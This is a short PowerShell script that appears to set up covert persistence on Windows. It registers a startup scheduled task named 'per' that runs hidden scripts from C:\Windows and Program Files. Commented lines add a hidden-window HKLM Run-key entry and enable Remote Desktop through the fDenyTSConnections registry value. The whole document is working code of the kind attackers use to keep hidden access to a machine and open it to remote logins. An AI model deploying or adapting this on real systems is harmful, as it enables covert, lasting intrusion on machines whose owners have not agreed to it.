# To Run:
# Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'per' -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command 'C:\Windows\perstart.ps1'"

# PERSTART
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -command C:\Windows\per.ps1; C:\Program` Files\per.ps1 "
$trigger = New-ScheduledTaskTrigger -AtStartup  # -Once -At 00:00 -RepetitionInterval (New-TimeSpan -Minutes 15)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable 
$task = New-ScheduledTask  -Action $action -Trigger $trigger -Settings $settings
Register-ScheduledTask -TaskName "per" -InputObject $task
Start-ScheduledTask -TaskName "per"

# PER
# Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'per' -Value "c:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command 'C:\Windows\perstart.ps1'"
# Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 # RDP enable